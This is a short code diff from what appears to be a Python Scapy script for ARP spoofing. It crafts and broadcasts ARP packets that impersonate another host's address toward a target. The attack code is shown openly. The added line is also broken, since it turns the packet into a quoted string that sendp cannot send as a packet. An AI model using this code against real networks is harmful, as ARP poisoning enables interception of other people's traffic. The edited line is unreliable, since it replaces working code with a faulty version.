@@ -27,5 +27,5 @@ impersonation =  # IMPERSONATION MAC
 
 # CRAFT & SEND PACKET
 
-packet = Ether()/ARP(op="who-has", hwsrc=my_mac, psrc=impersonation, pdst=target)
+packet = 'Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op="who-has", hwsrc='+my_mac+', psrc='+impersonation+', pdst='+target+')'
 sendp(packet)
